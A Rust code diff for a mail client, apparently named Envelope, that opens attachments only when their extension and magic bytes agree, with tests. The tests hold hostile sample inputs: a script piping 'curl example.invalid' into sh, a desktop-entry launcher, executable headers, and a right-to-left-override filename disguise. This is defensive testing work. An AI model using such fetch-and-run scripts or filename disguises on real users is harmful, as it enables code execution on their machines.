@@ -1327,6 +1327,17 @@ pub fn save_attachment(
     uid: u32,
     index: usize,
 ) -> Result<PathBuf, String> {
+    let (name, bytes) = attachment_of(connection, folder, uid, index)?;
+    attachment::save_into(&downloads(), &name, &bytes).map_err(|why| why.to_string())
+}
+
+/// One attachment of a stored message: its name and its decoded bytes.
+fn attachment_of(
+    connection: &Connection,
+    folder: &Folder,
+    uid: u32,
+    index: usize,
+) -> Result<(String, Vec<u8>), String> {
     let store =
         MaildirStore::open(connection.mailbox_path(folder)).map_err(|why| why.to_string())?;
     let raw = store
@@ -1342,7 +1353,159 @@ pub fn save_attachment(
         .ok_or_else(|| "that attachment is not in the message".to_string())?;
 
     let bytes = attachment::bytes_of(&raw, index).map_err(|why| why.to_string())?;
-    attachment::save_into(&downloads(), &attachment.name, &bytes).map_err(|why| why.to_string())
+    Ok((attachment.name.clone(), bytes))
+}
+
+/// A kind of attachment Envelope offers to open: data a desktop application
+/// reads — a pass, an invitation, a contact card, a document, a picture — and
+/// nothing that runs.
+///
+/// Two things have to agree before a file is opened. Its name, because the
+/// desktop picks a handler by the name a file is saved under: `invoice.sh` and
+/// `setup.desktop` are not offered at all. And its contents, because the
+/// desktop also looks inside: a script or a desktop entry saved as
+/// `invoice.pdf` is not a PDF, and is refused rather than handed to whatever
+/// the desktop would make of it. Anything else is saved, as before, and the
+/// step from "saved" to "ran" stays the user's.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Openable {
+    /// A pass or a bundle of passes, for Pocket. Both are ZIP archives.
+    Pass,
+    /// An invitation, for Slate.
+    Calendar,
+    /// A contact card, for Circle.
+    Card,
+    Pdf,
+    Png,
+    Jpeg,
+    Gif,
+    Webp,
+}
+
+impl Openable {
+    /// The kind a file saved under `name` would be opened as.
+    fn of_name(name: &str) -> Option<Self> {
+        let saved_as = attachment::sanitize(name);
+        let extension = std::path::Path::new(&saved_as)
+            .extension()?
+            .to_str()?
+            .to_ascii_lowercase();
+        Some(match extension.as_str() {
+            "pkpass" | "pkpasses" => Self::Pass,
+            "ics" => Self::Calendar,
+            "vcf" | "vcard" => Self::Card,
+            "pdf" => Self::Pdf,
+            "png" => Self::Png,
+            "jpg" | "jpeg" => Self::Jpeg,
+            "gif" => Self::Gif,
+            "webp" => Self::Webp,
+            _ => return None,
+        })
+    }
+
+    /// Whether `bytes` are a file of this kind, by how they begin.
+    fn is(self, bytes: &[u8]) -> bool {
+        match self {
+            Self::Pass => bytes.starts_with(b"PK\x03\x04"),
+            Self::Calendar => begins_object(bytes, b"BEGIN:VCALENDAR"),
+            Self::Card => begins_object(bytes, b"BEGIN:VCARD"),
+            Self::Pdf => bytes.starts_with(b"%PDF-"),
+            Self::Png => bytes.starts_with(b"\x89PNG\r\n\x1a\n"),
+            Self::Jpeg => bytes.starts_with(b"\xff\xd8\xff"),
+            Self::Gif => bytes.starts_with(b"GIF87a") || bytes.starts_with(b"GIF89a"),
+            Self::Webp => {
+                bytes.len() >= 12 && bytes.starts_with(b"RIFF") && &bytes[8..12] == b"WEBP"
+            }
+        }
+    }
+}
+
+/// Whether a text file's first line is `opening` — `BEGIN:VCALENDAR` or
+/// `BEGIN:VCARD`, which is how iCalendar and vCard files start — in either
+/// case, after a byte-order mark and any blank lines.
+fn begins_object(bytes: &[u8], opening: &[u8]) -> bool {
+    let text = bytes
+        .strip_prefix(b"\xef\xbb\xbf")
+        .unwrap_or(bytes)
+        .trim_ascii_start();
+    text.get(..opening.len())
+        .is_some_and(|line| line.eq_ignore_ascii_case(opening))
+        && text.get(opening.len()).is_none_or(u8::is_ascii_whitespace)
+}
+
+/// Whether an attachment with this name is offered an Open button.
+///
+/// By name alone: the row is drawn without reading the attachment. What is
+/// inside is checked when the button is pressed, by [`stage_attachment`].
+#[must_use]
+pub fn openable(name: &str) -> bool {
+    Openable::of_name(name).is_some()
+}
+
+/// Why an attachment was not written out to be opened. Each carries what the
+/// user is told: the attachment's name, or the reason.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum NotOpened {
+    /// Its name is not a kind of file Envelope opens.
+    NotOffered(String),
+    /// Its contents are not the kind of file its name says.
+    Disguised(String),
+    /// It could not be read out of the message or written to disk.
+    Failed(String),
+}
+
+/// Where attachments go to be opened: a directory of Envelope's own in the
+/// cache, not Downloads — opening a pass is not asking to keep a copy of it.
+/// Emptied when Envelope starts, by [`clear_opened`].
+#[must_use]
+pub fn opened_dir() -> PathBuf {
+    dirs::cache_dir()
+        .unwrap_or_else(std::env::temp_dir)
+        .join("envelope")
+        .join("opened")
+}
+
+/// Removes the copies earlier sessions wrote out to be opened.
+///
+/// At startup rather than after each one: the application a copy was handed
+/// to may read it at any time while it is open.
+pub fn clear_opened() {
+    if let Err(why) = remove_dir(&opened_dir()) {
+        tracing::warn!(%why, "could not remove the attachments opened last time");
+    }
+}
+
+/// Removes a directory and what is in it. One that is not there is removed.
+fn remove_dir(dir: &std::path::Path) -> std::io::Result<()> {
+    match std::fs::remove_dir_all(dir) {
+        Err(why) if why.kind() != std::io::ErrorKind::NotFound => Err(why),
+        _ => Ok(()),
+    }
+}
+
+/// Writes an attachment out for opening in its application, returning the
+/// file. Refuses one that is not [`Openable`] by its name and by its
+/// contents, whatever asked.
+pub fn stage_attachment(
+    connection: &Connection,
+    folder: &Folder,
+    uid: u32,
+    index: usize,
+) -> Result<PathBuf, NotOpened> {
+    let (name, bytes) = attachment_of(connection, folder, uid, index).map_err(NotOpened::Failed)?;
+    stage_into(&opened_dir(), &name, &bytes)
+}
+
+/// Writes `bytes` into `folder` under `name`, when both say it is a kind of
+/// file Envelope opens.
+fn stage_into(folder: &std::path::Path, name: &str, bytes: &[u8]) -> Result<PathBuf, NotOpened> {
+    let Some(kind) = Openable::of_name(name) else {
+        return Err(NotOpened::NotOffered(name.to_owned()));
+    };
+    if !kind.is(bytes) {
+        return Err(NotOpened::Disguised(name.to_owned()));
+    }
+    attachment::save_into(folder, name, bytes).map_err(|why| NotOpened::Failed(why.to_string()))
 }
 
 /// How a watch ended, as the app needs to hear it.
@@ -2671,6 +2834,139 @@ fn now_ms() -> i64 {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn data_attachments_are_offered_open_and_programs_are_not() {
+        // By the name the file is saved under, which is what the desktop
+        // picks the handler by.
+        for name in [
+            "BoardingPass.pkpass",
+            "family.PKPASSES",
+            "invite.ics",
+            "Ada Lovelace.vcf",
+            "ticket.pdf",
+            "photo.JPG",
+            // Saved without the trailing dot, so as a PDF.
+            "ticket.pdf.",
+        ] {
+            assert!(openable(name), "{name} should open");
+        }
+        for name in [
+            "run.sh",
+            "setup.desktop",
+            "invoice.pdf.sh",
+            "invoice.pdf.desktop",
+            // Reads as `invoicehs.pdf` where the override is honoured.
+            "invoice\u{202e}fdp.sh",
+            "installer.exe",
+            "tool.AppImage",
+            "archive.zip",
+            "letter.docm",
+            "page.html",
+            "drawing.svg",
+            "README",
+            "",
+        ] {
+            assert!(!openable(name), "{name} must not be offered Open");
+        }
+    }
+
+    /// The first bytes of a real file of each kind Envelope opens.
+    const GENUINE: &[(&str, &[u8])] = &[
+        ("pass.pkpass", b"PK\x03\x04\x14\x00"),
+        ("passes.pkpasses", b"PK\x03\x04\x14\x00"),
+        ("invite.ics", b"BEGIN:VCALENDAR\r\nVERSION:2.0\r\n"),
+        ("invite.ICS", b"\xef\xbb\xbf\r\nbegin:vcalendar\n"),
+        ("ada.vcf", b"BEGIN:VCARD\r\nVERSION:4.0\r\n"),
+        ("ada.vcard", b"BEGIN:VCARD\nVERSION:3.0\n"),
+        ("ticket.pdf", b"%PDF-1.7\n"),
+        ("photo.png", b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"),
+        ("photo.jpg", b"\xff\xd8\xff\xe0\x00\x10JFIF"),
+        ("photo.jpeg", b"\xff\xd8\xff\xe1"),
+        ("loop.gif", b"GIF89a\x01\x00"),
+        ("photo.webp", b"RIFF\x24\x00\x00\x00WEBPVP8 "),
+    ];
+
+    #[test]
+    fn an_attachment_that_is_what_its_name_says_is_written_out_to_be_opened() {
+        use std::os::unix::fs::PermissionsExt as _;
+
+        let dir = tempfile::tempdir().expect("tempdir");
+        for (name, bytes) in GENUINE {
+            let path = stage_into(dir.path(), name, bytes)
+                .unwrap_or_else(|why| panic!("{name} was refused: {why:?}"));
+
+            assert_eq!(std::fs::read(&path).expect("read"), *bytes);
+            let saved_as = path.file_name().expect("a file name").to_string_lossy();
+            assert_eq!(
+                Openable::of_name(&saved_as),
+                Openable::of_name(name),
+                "{name} was saved under a name that opens as something else"
+            );
+            let mode = std::fs::metadata(&path).expect("stat").permissions().mode();
+            assert_eq!(mode & 0o111, 0, "{name} was written executable");
+        }
+    }
+
+    #[test]
+    fn a_program_named_as_a_document_is_not_opened() {
+        // The desktop looks inside a file as well as at its name, so each of
+        // these would be handed to something other than a viewer.
+        let disguises: &[&[u8]] = &[
+            b"#!/bin/sh\ncurl example.invalid | sh\n",
+            b"\x7fELF\x02\x01\x01\x00",
+            b"[Desktop Entry]\nType=Application\nExec=sh -c 'true'\n",
+            b"MZ\x90\x00",
+            b"<html><script>location='file:///'</script></html>",
+            b"",
+        ];
+        let dir = tempfile::tempdir().expect("tempdir");
+        for (name, _) in GENUINE {
+            for disguise in disguises {
+                assert_eq!(
+                    stage_into(dir.path(), name, disguise),
+                    Err(NotOpened::Disguised((*name).to_owned())),
+                    "{name} holding {:?}",
+                    String::from_utf8_lossy(disguise)
+                );
+            }
+        }
+        // One kind's contents under another kind's name is a disguise too.
+        assert_eq!(
+            stage_into(dir.path(), "ticket.pdf", b"PK\x03\x04"),
+            Err(NotOpened::Disguised("ticket.pdf".to_owned()))
+        );
+        assert_eq!(
+            std::fs::read_dir(dir.path()).expect("read_dir").count(),
+            0,
+            "a refused attachment was written out anyway"
+        );
+    }
+
+    #[test]
+    fn a_program_is_not_opened_whatever_it_holds() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        for name in ["setup.desktop", "run.sh", "invoice.pdf.desktop", "tool"] {
+            // Even holding a real PDF: the name is what it would be saved
+            // and opened under.
+            assert_eq!(
+                stage_into(dir.path(), name, b"%PDF-1.7\n"),
+                Err(NotOpened::NotOffered(name.to_owned()))
+            );
+        }
+        assert_eq!(std::fs::read_dir(dir.path()).expect("read_dir").count(), 0);
+    }
+
+    #[test]
+    fn the_copies_opened_last_time_are_removed_and_none_is_not_an_error() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let opened = dir.path().join("opened");
+        stage_into(&opened, "ticket.pdf", b"%PDF-1.7\n").expect("staged");
+
+        remove_dir(&opened).expect("removed");
+        assert!(!opened.exists());
+        remove_dir(&opened).expect("nothing to remove is not a failure");
+    }
 
     /// A message whose only part is the HTML given.
     fn html_message(body: &str) -> Message {
